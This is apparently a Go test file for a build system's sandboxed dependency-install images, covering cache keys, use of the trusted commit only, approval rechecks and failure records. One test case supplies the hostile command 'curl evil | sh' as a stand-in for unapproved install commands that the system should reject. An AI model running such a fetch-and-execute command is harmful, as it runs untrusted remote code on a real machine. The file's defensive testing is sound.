package workflow

import (
	"archive/tar"
	"context"
	"crypto/sha256"
	"encoding/hex"
	"errors"
	"fmt"
	"io"
	"os"
	"path/filepath"
	"slices"
	"strings"
	"sync"
	"sync/atomic"
	"testing"

	"go.temporal.io/sdk/activity"
	"go.temporal.io/sdk/temporal"
	"go.temporal.io/sdk/testsuite"
	temporalworkflow "go.temporal.io/sdk/workflow"

	"buildgate/internal/projectconfig"
	"buildgate/internal/run"
	"buildgate/internal/runner"
	"buildgate/internal/sandbox"
	"buildgate/internal/sandbox/sandboxtest"
)

const testInstallWorkerImage = "localhost:5050/buildgate-worker@sha256:aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"

// fakeInstallImages is an in-memory image store.
type fakeInstallImages struct {
	mu      sync.Mutex
	images  map[string]sandbox.InstallImageRef
	builds  []sandbox.InstallImageBuild
	trees   map[string][]string
	lookups int
	evicted []string
	removed []string
}

func newFakeInstallImages() *fakeInstallImages {
	return &fakeInstallImages{images: map[string]sandbox.InstallImageRef{}, trees: map[string][]string{}}
}

func (f *fakeInstallImages) Lookup(_ context.Context, _, key string) (sandbox.InstallImageRef, error) {
	f.mu.Lock()
	defer f.mu.Unlock()
	f.lookups++
	return f.images[key], nil
}

func (f *fakeInstallImages) Build(_ context.Context, _ string, b sandbox.InstallImageBuild) (string, error) {
	f.mu.Lock()
	defer f.mu.Unlock()
	tarFile, err := os.Open(filepath.Join(b.ContextDir, "tree.tar"))
	if err != nil {
		return "", err
	}
	defer tarFile.Close()
	var names []string
	tr := tar.NewReader(tarFile)
	for {
		h, err := tr.Next()
		if err == io.EOF {
			break
		}
		if err != nil {
			return "", err
		}
		names = append(names, h.Name)
	}
	sum := sha256.Sum256([]byte(b.Key))
	ref := sandbox.InstallImageRepo + "@sha256:" + hex.EncodeToString(sum[:])
	f.images[b.Key] = sandbox.InstallImageRef{Image: ref, BuiltBy: b.BuiltBy}
	f.trees[b.Key] = names
	f.builds = append(f.builds, b)
	return ref, nil
}

func (f *fakeInstallImages) Evict(_ context.Context, _, repoKey string, _ int) (int, error) {
	f.mu.Lock()
	defer f.mu.Unlock()
	f.evicted = append(f.evicted, repoKey)
	return 0, nil
}

func (f *fakeInstallImages) SweepRunLocal(context.Context, string, func(string) bool) (int, error) {
	return 0, nil
}

func (f *fakeInstallImages) Remove(_ context.Context, _, key string) error {
	f.mu.Lock()
	defer f.mu.Unlock()
	f.removed = append(f.removed, key)
	delete(f.images, key)
	return nil
}

// installFixture is a real repository with an approved sandbox block, whose
// launches go through the package's fake sandbox runtime. An install launch
// (its /workspace is the scratch worktree) writes node_modules there.
type installFixture struct {
	*factoryDirFixture
	images *fakeInstallImages
	// installs records, per install launch, the commit its workspace held.
	installs []string
	// workspaces is every launch's /workspace.
	workspaces []string
	// installExit is the install launch's exit code.
	installExit int
}

func newInstallFixture(t *testing.T) *installFixture {
	t.Helper()
	f := &installFixture{factoryDirFixture: newFactoryDirFixture(t, map[string]string{
		".gitignore":             "node_modules\n",
		"package.json":           `{"name":"app"}` + "\n",
		"package-lock.json":      "{\"lockfileVersion\":3}\n",
		"vendor/x/package.json":  "{}\n",
		"scripts/postinstall.js": "// runs at install\n",
	}), images: newFakeInstallImages()}
	in := f.input
	in.BaseSHA = f.commit
	in.InstallCommands, in.InstallCachePaths, in.InstallRegistries = []string{"npm ci"}, []string{"node_modules"}, []string{"npm"}
	in.InstallRepoKey = "app-0123456789ab"
	in.SandboxSHA256 = projectconfig.Sandbox{Version: projectconfig.SandboxVersion, Install: in.InstallCommands, CachePaths: in.InstallCachePaths, Registries: in.InstallRegistries}.SHA256()
	in.SandboxImage, in.ConfiguredSandboxImage = testInstallWorkerImage, testInstallWorkerImage
	in.SandboxUser = fmt.Sprintf("65532:%d", os.Getgid())
	policy := testRegistryProxyPolicy()
	routes, err := sandbox.NarrowRegistryRoutes(policy.Routes, in.InstallRegistries)
	if err != nil {
		t.Fatal(err)
	}
	policy.Routes = routes
	in.RegistryProxyPolicy = policy
	in.RunID = "run-1"
	f.input = in
	approvals := t.TempDir()
	if err := projectconfig.OpenApprovals(approvals).Approve(in.InstallRepoKey, projectconfig.Approval{SandboxSHA256: in.SandboxSHA256, ApprovedBy: "operator"}); err != nil {
		t.Fatal(err)
	}
	f.acts.SandboxApprovalsDataDir = approvals
	f.acts.InstallImages = f.images
	f.acts.registryProxyHooks = sandbox.RegistryProxyHooks{
		StartRegistryProxy: func(context.Context, string, sandbox.RegistryProxySpec) (*sandbox.RegistryProxyHandle, error) {
			return &sandbox.RegistryProxyHandle{WorkerBaseURL: "http://registry-proxy:8092",
				AuditFacts: sandbox.RegistryProxyLaunchFacts{NetworkName: "factoryd-registryproxy-test", ContainerName: "proxy", WorkerBaseURL: "http://registry-proxy:8092"}}, nil
		},
		CleanupRegistryProxy: func(context.Context, *sandbox.RegistryProxyHandle) error { return nil },
		Address:              func(context.Context, string, string, string) (string, error) { return "172.28.0.2", nil },
		UpstreamFailures:     func(context.Context, string, string) (int, bool) { return 0, true },
	}
	recordMounts := f.rt.onCreate
	f.rt.onCreate = func(req sandbox.SandboxRequest) {
		recordMounts(req)
		workspace := ""
		for _, m := range req.Mounts {
			if m.Target == "/workspace" {
				workspace = m.Source
			}
		}
		f.workspaces = append(f.workspaces, workspace)
		if strings.Contains(workspace, string(filepath.Separator)+installBaseDirName) {
			f.installs = append(f.installs, gitIn(t, workspace, "rev-parse", "HEAD"))
			writeFile(t, filepath.Join(workspace, "node_modules/pkg/index.js"), "module.exports = 1\n")
			f.rt.ExitCode = f.installExit
		} else {
			f.rt.ExitCode = 0
		}
	}
	return f
}

func (f *installFixture) prepare(in RunWorkflowInput) (InstallImageResult, error) {
	f.t.Helper()
	if in.CheckpointDir == "" {
		in.CheckpointDir = f.t.TempDir()
	}
	var suite testsuite.WorkflowTestSuite
	env := suite.NewTestActivityEnvironment()
	env.RegisterActivity(f.acts.PrepareInstallImageActivity)
	val, err := env.ExecuteActivity(f.acts.PrepareInstallImageActivity, in)
	if err != nil {
		return InstallImageResult{}, err
	}
	var res InstallImageResult
	if err := val.Get(&res); err != nil {
		f.t.Fatal(err)
	}
	return res, nil
}

func (f *installFixture) mustPrepare(in RunWorkflowInput) InstallImageResult {
	f.t.Helper()
	res, err := f.prepare(in)
	if err != nil {
		f.t.Fatalf("prepare the install image: %v", err)
	}
	return res
}

// The first run builds the image from one install launch; a second run with
// the same key finds it and launches nothing.
func TestASecondRunWithTheSameKeyLaunchesNoInstall(t *testing.T) {
	f := newInstallFixture(t)
	first := f.mustPrepare(f.input)
	if first.Record == nil || first.Record.CacheHit || first.Image == "" || len(first.Attempts) != 1 || first.Attempts[0].Kind != run.InstallAttemptKind {
		t.Fatalf("first run: %+v, want a built image and one install attempt", first)
	}
	if first.Record.Scope != run.InstallScopeShared || first.Record.Commit != f.commit || first.Record.ApprovedBy != "operator" || first.Record.BuiltByRunID != "run-1" {
		t.Errorf("first record = %+v", first.Record)
	}
	if tree := f.images.trees[first.Record.Key]; !slices.Contains(tree, "node_modules/pkg/index.js") {
		t.Errorf("the image's tree is %v, want node_modules/pkg/index.js", tree)
	}
	if !slices.Equal(f.images.evicted, []string{f.input.InstallRepoKey}) {
		t.Errorf("evicted %v after the push, want the repository's older images", f.images.evicted)
	}
	second := f.input
	second.RunID = "run-2"
	again := f.mustPrepare(second)
	if again.Record == nil || !again.Record.CacheHit || again.Image != first.Image || len(again.Attempts) != 0 || again.Record.BuiltByRunID != "run-1" {
		t.Errorf("second run: %+v, want a cache hit with no attempt", again)
	}
	if len(f.installs) != 1 || len(f.images.builds) != 1 {
		t.Errorf("%d install launches and %d builds, want 1 each", len(f.installs), len(f.images.builds))
	}
}

// The key's inputs are the trusted commit's manifests and lockfiles: an edit
// in the worktree does not change them, vendor/ is not one, and the block's
// inputs patterns add files.
func TestInstallInputsAreTheTrustedCommitsLockfiles(t *testing.T) {
	f := newInstallFixture(t)
	ctx := context.Background()
	inputs, err := installKeyInputs(ctx, f.repo, f.commit, nil)
	if err != nil {
		t.Fatal(err)
	}
	var paths []string
	for _, in := range inputs {
		paths = append(paths, in.Path)
	}
	if !slices.Equal(paths, []string{"package-lock.json", "package.json"}) {
		t.Errorf("key inputs = %v, want the root manifest and lockfile only", paths)
	}
	plan, err := f.acts.planInstallImage(ctx, f.input)
	if err != nil {
		t.Fatal(err)
	}
	writeFile(t, filepath.Join(f.repo, "package-lock.json"), "{\"edited\":true}\n")
	writeFile(t, filepath.Join(f.repo, "node_modules/planted.js"), "planted\n")
	edited, err := f.acts.planInstallImage(ctx, f.input)
	if err != nil {
		t.Fatal(err)
	}
	if edited.key != plan.key || edited.scope != run.InstallScopeShared {
		t.Error("a worktree edit changed the install image's key")
	}
	withInputs := f.input
	withInputs.InstallInputs = []string{"scripts/*.js"}
	extra, err := installKeyInputs(ctx, f.repo, f.commit, withInputs.InstallInputs)
	if err != nil {
		t.Fatal(err)
	}
	if len(extra) != 3 || extra[2].Path != "scripts/postinstall.js" {
		t.Errorf("with inputs, key inputs = %+v, want scripts/postinstall.js added", extra)
	}
}

// The install runs on a scratch worktree of the trusted commit, never on the
// run's worktree; when the run's base commit has other inputs, the image is
// built from it with a run-local scope that no other run looks up.
func TestInstallImageIsBuiltFromTheTrustedCommitOnly(t *testing.T) {
	f := newInstallFixture(t)
	// What a build left in the run's worktree reaches nothing.
	writeFile(t, filepath.Join(f.repo, "node_modules/planted.js"), "planted\n")
	writeFile(t, filepath.Join(f.repo, "package-lock.json"), "{\"edited\":true}\n")
	shared := f.mustPrepare(f.input)
	if len(f.installs) != 1 || f.installs[0] != f.commit {
		t.Fatalf("install launches on %v, want one on the trusted commit %s", f.installs, f.commit)
	}
	if slices.Contains(f.workspaces, f.repo) {
		t.Error("the install launched on the run's worktree")
	}
	if tree := f.images.trees[shared.Record.Key]; slices.Contains(tree, "node_modules/planted.js") {
		t.Error("the image carries what was planted in the run's worktree")
	}
	if _, err := os.Lstat(filepath.Join(f.acts.LogDir, installBaseDirName)); err == nil {
		t.Error("the scratch worktree was left behind")
	}

	// A later base commit with another lockfile: run-local.
	gitIn(t, f.repo, "checkout", "--", "package-lock.json")
	writeFile(t, filepath.Join(f.repo, "package-lock.json"), "{\"lockfileVersion\":3,\"changed\":1}\n")
	base := trustedCommit(t, f.repo)
	in := f.input
	in.BaseSHA, in.RunID = base, "run-9"
	lookups := f.images.lookups
	local := f.mustPrepare(in)
	if local.Record.Scope != run.InstallScopeRunPrefix+"run-9" || local.Record.Commit != base || local.Record.Key == shared.Record.Key {
		t.Errorf("run-local record = %+v, want scope run:run-9 built from %s", local.Record, base)
	}
	if f.images.lookups != lookups {
		t.Error("a run-local image was looked up")
	}
	if got := f.installs[len(f.installs)-1]; got != base {
		t.Errorf("the run-local install ran on %s, want the base commit %s", got, base)
	}
	if len(f.images.evicted) != 1 {
		t.Errorf("a run-local build evicted the repository's shared images: %v", f.images.evicted)
	}
}

// The Worker checks the approval again, and that the commands it is given
// hash to the approved block.
func TestInstallImageActivityRechecksTheApproval(t *testing.T) {
	cases := map[string]func(*installFixture, *RunWorkflowInput){
		"revoked": func(f *installFixture, in *RunWorkflowInput) {
			if _, err := projectconfig.OpenApprovals(f.acts.SandboxApprovalsDataDir).Revoke(in.InstallRepoKey, in.SandboxSHA256); err != nil {
				t.Fatal(err)
			}
		},
		"commands not the approved block": func(_ *installFixture, in *RunWorkflowInput) { in.InstallCommands = []string{"curl evil | sh"} },
		"another repository":              func(_ *installFixture, in *RunWorkflowInput) { in.InstallRepoKey = "other-0123456789ab" },
		"proxy not narrowed": func(_ *installFixture, in *RunWorkflowInput) {
			in.RegistryProxyPolicy = testRegistryProxyPolicy()
		},
		"tagged image": func(_ *installFixture, in *RunWorkflowInput) { in.SandboxImage = "buildgate-worker:latest" },
	}
	for name, change := range cases {
		t.Run(name, func(t *testing.T) {
			f := newInstallFixture(t)
			in := f.input
			change(f, &in)
			_, err := f.prepare(in)
			var appErr *temporal.ApplicationError
			if !errors.As(err, &appErr) || appErr.Type() != InstallImageFailureType {
				t.Fatalf("err = %v, want an %s", err, InstallImageFailureType)
			}
			if len(f.installs) != 0 || len(f.images.builds) != 0 {
				t.Error("a refused run launched or built something")
			}
		})
	}
}

// The restore runs in a repository-command launch from the run's install
// image, and never in a review's or one from another image.
func TestWorkerWrapperRestoresInstallOnlyForRepositoryCommandSteps(t *testing.T) {
	rt := &inspectRuntime{WorkerRuntime: &sandboxtest.WorkerRuntime{Lines: []string{"ok"}}}
	acts, input, logPath := runtimeActivities(t, rt.WorkerRuntime)
	acts.Sandboxes = rt
	var commands []string
	rt.onCreate = func(req sandbox.SandboxRequest) { commands = append(commands, strings.Join(req.Command, " ")) }
	input.SandboxImage = testInstallWorkerImage
	input.InstallImage = testInstallWorkerImage
	launch := func(ctx context.Context, in RunWorkflowInput) bool {
		t.Helper()
		if _, err := acts.runSandboxWithRetries(ctx, in, logPath, 1, nil, nil, nil, nil, nil, nil, nil, "sh", "-c", "true"); err != nil {
			t.Fatal(err)
		}
		return strings.Contains(commands[len(commands)-1], sandbox.InstallDir+"; if")
	}
	if !launch(context.Background(), input) {
		t.Error("a repository-command launch from the install image did not restore it")
	}
	if launch(forReviewLaunch(context.Background()), input) {
		t.Error("a review's launch restored the install")
	}
	other := input
	other.InstallImage = ""
	if launch(context.Background(), other) {
		t.Error("a launch with no install image restored one")
	}
}

// installWorkflowEnv is the workflow environment with a
// PrepareInstallImageActivity that returns result and counts its calls, and
// an EvictRunInstallImageActivity that records the key it removes.
func installWorkflowEnv(t *testing.T, result InstallImageResult, calls *atomic.Int32, evicted *[]string, builds *[]RunWorkflowInput) *testsuite.TestWorkflowEnvironment {
	t.Helper()
	env := newWorkflowEnvironment(t,
		func(_ context.Context, in RunWorkflowInput) (BuildActivityResult, error) {
			*builds = append(*builds, in)
			return BuildActivityResult{Result: runner.Result{ExitCode: 0}}, nil
		},
		func(context.Context, RunWorkflowInput) (VerifyActivityResult, error) {
			return VerifyActivityResult{Result: runner.Result{Command: []string{"sh", "-c", "make verify"}, ExitCode: 0}}, nil
		},
		func(context.Context, EvaluateGateInput) (run.GateResult, error) {
			return run.GateResult{Check: "canonical_verify", Passed: true}, nil
		},
	)
	env.RegisterActivityWithOptions(func(context.Context, RunWorkflowInput) (InstallImageResult, error) {
		calls.Add(1)
		return result, nil
	}, activity.RegisterOptions{Name: PrepareInstallImageActivityName})
	env.RegisterActivityWithOptions(func(_ context.Context, in EvictRunInstallImageInput) error {
		*evicted = append(*evicted, in.Key)
		return nil
	}, activity.RegisterOptions{Name: EvictRunInstallImageActivityName})
	return env
}

func TestRunWorkflowLaunchesEveryStepFromTheInstallImage(t *testing.T) {
	for _, scope := range []string{run.InstallScopeShared, run.InstallScopeRunPrefix + "r1"} {
		t.Run(scope, func(t *testing.T) {
			image := sandbox.InstallImageRepo + "@sha256:" + strings.Repeat("c", 64)
			record := &run.InstallImage{Key: "k1", Scope: scope, Image: image}
			var calls atomic.Int32
			var evicted []string
			var builds []RunWorkflowInput
			env := installWorkflowEnv(t, InstallImageResult{Image: image, Record: record}, &calls, &evicted, &builds)
			in := fixtureInput()
			in.SandboxSHA256 = "hash"
			env.ExecuteWorkflow(RunWorkflow, in)
			var result RunWorkflowResult
			if err := env.GetWorkflowError(); err != nil {
				t.Fatal(err)
			}
			if err := env.GetWorkflowResult(&result); err != nil {
				t.Fatal(err)
			}
			if calls.Load() != 1 || result.Install == nil || result.Install.Image != image || result.State != run.StateAccepted {
				t.Errorf("calls=%d install=%+v state=%s", calls.Load(), result.Install, result.State)
			}
			if len(builds) == 0 || builds[0].SandboxImage != image || builds[0].InstallImage != image {
				t.Errorf("the build was not launched from the install image: %+v", builds)
			}
			wantEvicted := scope != run.InstallScopeShared
			if (len(evicted) == 1) != wantEvicted {
				t.Errorf("evicted %v, want eviction only for a run-local image", evicted)
			}
		})
	}
}

// TestHistoryRecordedBeforeTheInstallImageReplaysUnchanged pins the change to
// DefaultVersion, what a history recorded before install-image replays as:
// no install image Activity, and the run ends as it did.
func TestHistoryRecordedBeforeTheInstallImageReplaysUnchanged(t *testing.T) {
	var calls atomic.Int32
	var evicted []string
	var builds []RunWorkflowInput
	env := installWorkflowEnv(t, InstallImageResult{}, &calls, &evicted, &builds)
	env.OnGetVersion(installImageChange, temporalworkflow.DefaultVersion, 1).Return(temporalworkflow.DefaultVersion)
	in := fixtureInput()
	in.SandboxSHA256 = "hash"
	env.ExecuteWorkflow(RunWorkflow, in)
	var result RunWorkflowResult
	if err := env.GetWorkflowError(); err != nil {
		t.Fatal(err)
	}
	if err := env.GetWorkflowResult(&result); err != nil {
		t.Fatal(err)
	}
	if calls.Load() != 0 || result.Install != nil || result.State != run.StateAccepted {
		t.Errorf("replay of a pre-install-image history: calls=%d install=%+v state=%s, want no Activity and accepted", calls.Load(), result.Install, result.State)
	}
	if len(builds) == 0 || builds[0].InstallImage != "" {
		t.Error("the replayed build was given an install image")
	}
}

// A failed install is refused with its attempt and log on the error, so the
// run's record holds them; no image is built.
func TestAFailedInstallIsRecordedOnTheRunsError(t *testing.T) {
	f := newInstallFixture(t)
	f.installExit = 1
	_, err := f.prepare(f.input)
	var appErr *temporal.ApplicationError
	if !errors.As(err, &appErr) || appErr.Type() != InstallImageFailureType {
		t.Fatalf("err = %v, want an %s", err, InstallImageFailureType)
	}
	attempts := AttemptsFromError(err)
	if len(attempts) != 1 || attempts[0].Kind != run.InstallAttemptKind || attempts[0].ExitCode != 1 || attempts[0].LogPath == "" {
		t.Errorf("attempts on the error = %+v, want the failed install with its log", attempts)
	}
	if len(f.images.builds) != 0 {
		t.Error("a failed install built an image")
	}

	// The workflow keeps them on its own failure.
	var calls atomic.Int32
	var evicted []string
	var builds []RunWorkflowInput
	env := newWorkflowEnvironment(t,
		func(_ context.Context, in RunWorkflowInput) (BuildActivityResult, error) {
			return BuildActivityResult{}, nil
		},
		func(context.Context, RunWorkflowInput) (VerifyActivityResult, error) {
			return VerifyActivityResult{}, nil
		},
		func(context.Context, EvaluateGateInput) (run.GateResult, error) { return run.GateResult{}, nil },
	)
	env.RegisterActivityWithOptions(func(context.Context, RunWorkflowInput) (InstallImageResult, error) {
		calls.Add(1)
		return InstallImageResult{}, withInstallAttempts(installFailure("install image: the sandbox install exited 1"), attempts)
	}, activity.RegisterOptions{Name: PrepareInstallImageActivityName})
	env.RegisterActivityWithOptions(func(_ context.Context, in EvictRunInstallImageInput) error {
		evicted = append(evicted, in.Key)
		return nil
	}, activity.RegisterOptions{Name: EvictRunInstallImageActivityName})
	in := fixtureInput()
	in.SandboxSHA256 = "hash"
	env.ExecuteWorkflow(RunWorkflow, in)
	werr := env.GetWorkflowError()
	if werr == nil {
		t.Fatal("the run went on after its install failed")
	}
	if got := AttemptsFromError(werr); len(got) != 1 || got[0].Kind != run.InstallAttemptKind {
		t.Errorf("the workflow's error carries %+v, want the install attempt", got)
	}
	if len(builds) != 0 {
		t.Error("a build ran after the install failed")
	}
}

// A cache path the checked-out commit does not ignore is refused before the
// install runs.
func TestACachePathGitDoesNotIgnoreIsRefusedBeforeTheInstall(t *testing.T) {
	f := newInstallFixture(t)
	writeFile(t, filepath.Join(f.repo, ".gitignore"), "dist\n")
	in := f.input
	in.ProjectConfigCommitSHA = trustedCommit(t, f.repo)
	in.BaseSHA = in.ProjectConfigCommitSHA
	_, err := f.prepare(in)
	if err == nil || !strings.Contains(err.Error(), "is not ignored by git") {
		t.Fatalf("err = %v, want the cache path refused", err)
	}
	if len(f.installs) != 0 {
		t.Error("the install ran before the cache path was checked")
	}
}

// The key's names include package-manager settings and tool wrappers, a name
// with a slash matching at any depth and as a pattern.
func TestInstallKeyNamesCoverSettingsAndWrappers(t *testing.T) {
	names := installKeyNames()
	for p, want := range map[string]bool{
		".npmrc": true, "web/.yarnrc": true, ".yarn/releases/yarn-4.1.0.cjs": true, "app/.yarn/releases/yarn.cjs": true,
		"bun.lockb": true, "src/NuGet.config": true, ".cargo/config.toml": true, ".bundle/config": true,
		".mvn/wrapper/maven-wrapper.properties": true, "svc/.mvn/maven.config": true, "gradle/wrapper/gradle-wrapper.properties": true,
		"vendor/x/.npmrc": false, "README.md": false, ".yarn/cache/x.zip": false, "config": false,
	} {
		if got := installKeyInput(p, names, nil); got != want {
			t.Errorf("%s is a key input: %v, want %v", p, got, want)
		}
	}
}
